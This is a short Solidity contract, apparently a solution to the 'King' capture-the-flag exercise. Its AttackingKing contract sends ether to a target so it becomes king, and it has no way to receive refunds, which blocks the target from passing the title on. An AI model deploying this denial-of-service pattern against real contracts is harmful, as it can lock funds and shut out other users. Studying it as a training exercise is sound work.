// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

interface KingInterface {
    function _prize() external view returns (uint256);
    receive() external payable;
}

contract AttackingKing {
    address public contractAddress;
    uint256 public _value;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        _value = msg.value;
    }

    function hackContract() external {
        // Code me!
        payable(contractAddress).call{value: _value}("");
    }
}
